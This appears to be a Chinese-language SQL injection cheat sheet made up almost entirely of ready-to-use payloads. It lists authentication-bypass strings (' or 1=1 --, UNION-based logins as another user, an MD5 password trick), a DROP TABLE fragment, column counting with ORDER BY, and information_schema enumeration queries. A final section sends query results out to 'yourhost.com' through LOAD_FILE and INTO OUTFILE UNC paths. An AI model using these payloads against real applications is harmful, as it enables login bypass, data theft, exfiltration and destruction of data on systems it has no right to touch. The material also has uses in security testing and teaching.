# 注释型注入

- 注释忽略 : name'-- 或者name; DROP TABLE ... /* 

```
SELECT * FROM ... WHERE username = 'admin'--' AND password = 'password'
```

- 判断版本高于3.23.02 : /*!32302 1/0, */

```
SELECT /*!32302 1/0, */ 1 FROM tablename 
```

# 联合查询注入

- 查询漏洞 : UNION (ALL) statement

以其他用户的登录

```
' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
```

# 登录注入

- 使用上述两种方法构造

```
admin' --

admin' #

admin' /*

' or 1=1 --

' or 1=1 #

' or 1=1 /*

') or '1'='1 --

') or ('1'='1 --

' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
```

- 针对密码非数据库hash的方法需要构造一个md5码
```
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
```

# 找出数据表的列数

- 使用order by
```
依次执行
ORDER BY 1--
ORDER BY 2--
ORDER BY N-- so on
```

# mysql 数据库注入
- 执行
```
SELECT table_name FROM information_schema.tables WHERE table_schema = 'tablename'

SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tablename'
```

# 溢出
```
?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\'))) 
Makes a NBNS query request/DNS resolution request to yourhost.com

?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')
Writes data to your shared folder/file

{INJECTION} = You want to run the query.
```